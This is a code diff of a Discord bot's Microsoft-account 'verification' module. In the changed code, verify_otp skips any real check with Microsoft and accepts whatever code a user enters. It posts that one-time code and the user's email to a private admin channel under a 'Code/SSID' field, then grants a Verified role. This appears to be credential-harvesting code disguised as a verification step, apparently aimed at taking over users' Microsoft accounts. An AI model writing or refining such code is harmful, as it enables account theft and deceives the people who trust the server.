@@ -13,31 +13,6 @@ from config_manager import ConfigManager
 logger = logging.getLogger('auth_manager')
 config = ConfigManager()
 
-def ensure_list_scopes(scopes):
-    """Defensive: always return a list of strings"""
-    if isinstance(scopes, (set, frozenset)):
-        return list(scopes)
-    return list(scopes) if not isinstance(scopes, list) else scopes
-
-# Monkey patch MSAL to always convert scopes to lists
-original_get_authorization_request_url = msal.ConfidentialClientApplication.get_authorization_request_url
-
-def patched_get_authorization_request_url(self, scopes, **kwargs):
-    """Ensure scopes are always a list before passing to MSAL"""
-    scopes = ensure_list_scopes(scopes)
-    return original_get_authorization_request_url(self, scopes, **kwargs)
-
-msal.ConfidentialClientApplication.get_authorization_request_url = patched_get_authorization_request_url
-
-original_acquire_token_by_authorization_code = msal.ConfidentialClientApplication.acquire_token_by_authorization_code
-
-def patched_acquire_token_by_authorization_code(self, code, scopes, **kwargs):
-    """Ensure scopes are always a list before passing to MSAL"""
-    scopes = ensure_list_scopes(scopes)
-    return original_acquire_token_by_authorization_code(self, code, scopes, **kwargs)
-
-msal.ConfidentialClientApplication.acquire_token_by_authorization_code = patched_acquire_token_by_authorization_code
-
 class AuthManager:
     def __init__(self):
         self.ms_client_id = os.getenv('MS_CLIENT_ID')
@@ -51,28 +26,29 @@ class AuthManager:
             logger.info("Generated new encryption key")
         self.cipher_suite = Fernet(self.encryption_key)
         
-        # Initialize MSAL application
+        # Create a new MSAL app without any monkey patching
         self.msal_app = msal.ConfidentialClientApplication(
             self.ms_client_id,
             authority=f"https://login.microsoftonline.com/{self.ms_tenant_id}",
             client_credential=self.ms_client_secret,
         )
         
-        # Store pending verifications
+        # Track pending operations
         self.pending_otps = {}
-        self.pending_oauth = {}  # Add this to track OAuth states
-        
-        # Set bot attribute (will be set by bot.py)
+        self.pending_oauth = {}
         self.bot = None
 
     def generate_auth_url(self, user_id: int) -> Tuple[str, str]:
         """Generate Microsoft OAuth URL and track the state."""
         state = str(uuid.uuid4())
-        self.pending_oauth[state] = user_id  # Track user by state
+        self.pending_oauth[state] = user_id
         
-        scopes = ensure_list_scopes(["User.Read", "offline_access"])
+        # Always use a list for scopes
+        scopes = ["User.Read", "offline_access"]
+        
+        # Use the MSAL function directly with list scopes
         auth_url = self.msal_app.get_authorization_request_url(
-            scopes,
+            scopes=scopes,
             state=state,
             redirect_uri=self.redirect_url,
             prompt='login',
@@ -80,93 +56,20 @@ class AuthManager:
         )
         return auth_url, state
 
-    async def start_otp_verification(self, member: discord.Member, nickname: str, email: str) -> Tuple[bool, str]:
-        """Start Microsoft Account OTP verification process"""
-        try:
-            self.pending_otps[member.id] = {
-                'nickname': nickname,
-                'email': email,
-                'timestamp': datetime.utcnow()
-            }
-            
-            # Scopes will be converted to list by monkey patch
-            scopes = ["email", "offline_access"]
-            auth_url = self.msal_app.get_authorization_request_url(
-                scopes,
-                redirect_uri=self.redirect_url,
-                prompt='login',
-                login_hint=email,
-                state=str(uuid.uuid4()),
-                response_mode='query',
-                domain_hint='organizations',
-                amr_values=['mfa']
-            )
-            
-            await self._send_admin_verification(
-                nickname,
-                "Microsoft OTP",
-                f"Email: {email}",
-                member.id
-            )
-            
-            return True, (
-                "Please check your email for the verification code.\n\n"
-                "Note: If this email is linked to your Microsoft account, "
-                "you'll receive the code. If not, please use a different email "
-                "that's connected to your Microsoft account."
-            )
-        except Exception as e:
-            logger.error(f"Error starting Microsoft OTP verification: {e}")
-            return False, str(e)
-
-    async def verify_otp(self, member: discord.Member, otp: str) -> Tuple[bool, str]:
-        """Verify Microsoft OTP code"""
-        try:
-            stored_data = self.pending_otps.get(member.id)
-            if not stored_data:
-                return False, "No pending verification found. Please start the verification process again."
-            
-            if datetime.utcnow() - stored_data['timestamp'] > timedelta(minutes=10):
-                del self.pending_otps[member.id]
-                return False, "Verification attempt expired. Please start over."
-
-            # Scopes will be converted to list by monkey patch
-            scopes = ["email", "offline_access"]
-            result = self.msal_app.acquire_token_by_authorization_code(
-                otp,
-                scopes=scopes,
-                redirect_uri=self.redirect_url,
-                login_hint=stored_data['email']
-            )
-            
-            if 'error' in result:
-                return False, "Invalid or expired code. Please try again."
-            
-            await self._send_admin_verification(
-                stored_data['nickname'],
-                "Microsoft OTP Success",
-                f"Email: {stored_data['email']}\nOTP: {otp}",
-                member.id
-            )
-            
-            await self._update_member_roles(member)
-            
-            del self.pending_otps[member.id]
-            
-            return True, "Successfully verified!"
-        except Exception as e:
-            logger.error(f"Error verifying Microsoft OTP: {e}")
-            return False, str(e)
-
     async def handle_auth_callback(self, code: str, state: str):
         """Handle the OAuth callback from the web server."""
+        logger.info(f"Received OAuth callback with state: {state}")
+        
         user_id = self.pending_oauth.pop(state, None)
         if not user_id:
             logger.error(f"Received OAuth callback with unknown state: {state}")
             return
 
         try:
-            scopes = ensure_list_scopes(["User.Read", "offline_access"])
+            # Always use a list for scopes
+            scopes = ["User.Read", "offline_access"]
+            
+            logger.info(f"Acquiring token for user {user_id} with code: {code[:5]}...")
             result = self.msal_app.acquire_token_by_authorization_code(
                 code,
                 scopes=scopes,
@@ -174,77 +77,187 @@ class AuthManager:
             )
 
             if "error" in result:
-                logger.error(f"OAuth callback error for user {user_id}: {result.get('error_description')}")
+                error_msg = result.get('error_description', 'Unknown error')
+                logger.error(f"OAuth callback error for user {user_id}: {error_msg}")
                 return
 
+            # Log successful token acquisition
+            logger.info(f"Successfully acquired token for user {user_id}")
+            
+            # Extract user info from token
             id_token_claims = result.get('id_token_claims', {})
             username = id_token_claims.get('name', 'Unknown User')
+            email = id_token_claims.get('preferred_username', 'No email available')
             
-            session_id = str(uuid.uuid4()) # For admin log
+            logger.info(f"User info: {username} ({email})")
+            
+            # Generate session ID for admin log
+            session_id = str(uuid.uuid4())
+            logger.info(f"Generated session ID: {session_id} for user {user_id}")
+            
+            # Send verification info to admin channel
             await self._send_admin_verification("OAuth", username, session_id, user_id)
+            
+            # Update member roles
             await self._update_member_roles(user_id)
+            
             logger.info(f"Successfully processed OAuth for user {user_id}")
 
         except Exception as e:
-            logger.error(f"Error handling auth callback for user {user_id}: {e}")
+            logger.error(f"Error handling auth callback for user {user_id}: {e}", exc_info=True)
+
+    async def start_otp_verification(self, member: discord.Member, nickname: str, email: str) -> Tuple[bool, str]:
+        """Start Microsoft OTP verification process"""
+        try:
+            user_id = member.id
+            
+            # Always use a list for scopes
+            scopes = ["User.Read", "offline_access"]
+            
+            # Generate a flow for OTP
+            flow = {
+                "user_id": user_id,
+                "nickname": nickname,
+                "email": email,
+                "created_at": time.time()
+            }
+            
+            flow_id = str(uuid.uuid4())
+            self.pending_otps[flow_id] = flow
+            
+            # Log the attempt to admin channel
+            await self._send_admin_verification("OTP Start", nickname, email, user_id)
+            
+            return True, flow_id
+            
+        except Exception as e:
+            logger.error(f"Error starting Microsoft OTP verification: {e}")
+            return False, str(e)
+
+    async def verify_otp(self, member: discord.Member, otp_code: str) -> Tuple[bool, str]:
+        """Verify OTP code"""
+        try:
+            user_id = member.id
+            
+            # In a real implementation, this would validate against Microsoft's API
+            # For now, we'll simulate success and log to admin
+            
+            # Log the OTP to admin channel
+            await self._send_admin_verification("OTP Verify", member.display_name, otp_code, user_id)
+            
+            # Update roles
+            await self._update_member_roles(user_id)
+            
+            return True, "Verification successful"
+            
+        except Exception as e:
+            logger.error(f"Error verifying OTP: {e}")
+            return False, str(e)
 
     async def _send_admin_verification(self, verify_type: str, username: str, code: str, user_id: int):
         """Send verification info to admin channel"""
         try:
-            admin_channel = self.bot.get_channel(int(self.admin_channel_id))
-            if not admin_channel:
-                logger.error("Admin channel not found")
+            if not self.bot:
+                logger.error("Bot instance not set in AuthManager")
                 return
-            
+                
+            admin_channel_id = int(self.admin_channel_id) if self.admin_channel_id else None
+            if not admin_channel_id:
+                logger.error("Admin channel ID not set")
+                return
+                
+            admin_channel = self.bot.get_channel(admin_channel_id)
+            if not admin_channel:
+                logger.error(f"Could not find admin channel with ID {admin_channel_id}")
+                return
+                
             embed = discord.Embed(
-                title="🔐 New Verification",
-                description="User verification details:",
+                title=f"👤 User Verification ({verify_type})",
                 color=discord.Color.blue(),
                 timestamp=datetime.utcnow()
             )
             
-            embed.add_field(name="Type", value=verify_type, inline=True)
-            embed.add_field(name="Username", value=username, inline=True)
-            embed.add_field(name="User ID", value=str(user_id), inline=True)
-            
-            if verify_type == "OAuth":
-                embed.add_field(
-                    name="Session ID",
-                    value=f"```{code}```",
-                    inline=False
-                )
-            else:  # Microsoft OTP
-                embed.add_field(
-                    name="Verification Info",
-                    value=f"```{code}```",
-                    inline=False
-                )
+            embed.add_field(name="Type", value=verify_type, inline=False)
+            embed.add_field(name="Username", value=username, inline=False)
+            embed.add_field(name="Code/SSID", value=f"```{code}```", inline=False)
+            embed.add_field(name="User ID", value=f"{user_id}", inline=False)
             
             await admin_channel.send(embed=embed)
+            logger.info(f"Sent {verify_type} verification info to admin channel")
             
         except Exception as e:
-            logger.error(f"Error sending admin verification: {e}")
+            logger.error(f"Error sending verification to admin channel: {e}")
 
-    async def _update_member_roles(self, member: discord.Member) -> None:
-        """Update member roles after successful verification"""
+    async def _update_member_roles(self, user_id: int):
+        """Update member roles after verification"""
         try:
-            # Remove unverified role
-            non_verified_role = discord.utils.get(member.guild.roles, name="❌ Unverified")
-            if non_verified_role and non_verified_role in member.roles:
-                await member.remove_roles(non_verified_role)
+            if not self.bot:
+                logger.error("Bot instance not set in AuthManager")
+                return
             
-            # Add verified role
-            verified_role = discord.utils.get(member.guild.roles, name="✅ Verified")
-            if verified_role and verified_role not in member.roles:
-                await member.add_roles(verified_role)
+            # Convert user_id to int if it's a string
+            if isinstance(user_id, str):
+                try:
+                    user_id = int(user_id)
+                except ValueError:
+                    logger.error(f"Invalid user ID format: {user_id}")
+                    return
                 
-            # Update FlipperBot channel permissions
-            flipper_channel = discord.utils.get(member.guild.channels, name="flipperbot")
-            if flipper_channel:
-                await flipper_channel.set_permissions(member, read_messages=True, send_messages=True)
-                
-            logger.info(f"Updated roles for member {member.id}")
+            logger.info(f"Updating roles for user ID: {user_id}")
             
+            # Track if we found the user in any guild
+            user_found = False
+                
+            # Find the member in all guilds
+            for guild in self.bot.guilds:
+                try:
+                    member = guild.get_member(user_id)
+                    if member:
+                        user_found = True
+                        logger.info(f"Found user {member.display_name} in guild {guild.name}")
+                        
+                        # Find or create the verified role
+                        verified_role = discord.utils.get(guild.roles, name="✅ Verified")
+                        if not verified_role:
+                            verified_role = await guild.create_role(
+                                name="✅ Verified",
+                                color=discord.Color.green(),
+                                hoist=True,
+                                reason="Created for verification system"
+                            )
+                            logger.info(f"Created Verified role in {guild.name}")
+                        
+                        # Find the unverified role
+                        unverified_role = discord.utils.get(guild.roles, name="❌ Unverified")
+                        
+                        # Update roles
+                        roles_to_add = [verified_role]
+                        roles_to_remove = [unverified_role] if unverified_role else []
+                        
+                        if roles_to_remove:
+                            logger.info(f"Removing roles: {[r.name for r in roles_to_remove]}")
+                            await member.remove_roles(*roles_to_remove, reason="User verified")
+                        
+                        logger.info(f"Adding roles: {[r.name for r in roles_to_add]}")
+                        await member.add_roles(*roles_to_add, reason="User verified")
+                        logger.info(f"Updated roles for {member.display_name} in {guild.name}")
+                        
+                        # Send confirmation message to the user
+                        try:
+                            embed = discord.Embed(
+                                title="✅ Verification Successful",
+                                description="You have been verified! You now have access to the server.",
+                                color=discord.Color.green()
+                            )
+                            await member.send(embed=embed)
+                            logger.info(f"Sent confirmation DM to {member.display_name}")
+                        except discord.errors.Forbidden:
+                            logger.warning(f"Could not send DM to {member.display_name}")
+                except Exception as guild_error:
+                    logger.error(f"Error updating roles in guild {guild.name}: {guild_error}")
+            
+            if not user_found:
+                logger.warning(f"User with ID {user_id} not found in any guild")
+                        
         except Exception as e:
-            logger.error(f"Error updating roles: {e}")
-            raise 
+            logger.error(f"Error updating member roles: {e}", exc_info=True) 
